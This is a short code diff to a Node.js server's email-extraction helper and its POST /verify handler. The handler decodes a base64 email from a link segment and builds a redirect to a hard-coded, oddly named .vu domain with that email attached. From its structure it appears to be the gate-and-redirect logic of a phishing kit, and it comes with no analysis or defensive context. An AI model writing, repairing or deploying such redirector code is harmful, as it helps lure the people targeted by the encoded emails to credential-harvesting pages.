@@ -85,6 +85,8 @@ function extractEmail(segment) {
     let target = segment.trim();
     if (target.startsWith('$(') && target.endsWith(')')) {
         target = target.substring(2, target.length - 1);
+    } else if (target.startsWith('$')) {
+        target = target.substring(1);
     }
 
     // Normalize base64
@@ -156,15 +158,13 @@ app.post('/verify', async (req, res) => {
 
             // Build the success redirect URL, attaching the email parameters
             const baseUrl = process.env.REDIRECT_BASE_URL || 'https://solutionlifeseniorservicescapital.forklcwardlawllp.vu';
-            const random_str = Math.random().toString(36).substring(2, 15);
-            const finalBaseUrl = baseUrl + '/' + random_str + '$' + encodeURIComponent(cleanB64);
-            const urlObj = new URL(finalBaseUrl);
-            urlObj.searchParams.set('email', decodedEmail);
+            const cleanBaseUrl = baseUrl.endsWith('/') ? baseUrl.slice(0, -1) : baseUrl;
+            const redirectUrl = cleanBaseUrl + '/$' + encodeURIComponent(cleanB64);
 
             return res.json({
                 status: 'success',
                 email: decodedEmail,
-                redirectUrl: urlObj.toString()
+                redirectUrl: redirectUrl
             });
         } else {
             return res.status(403).json({
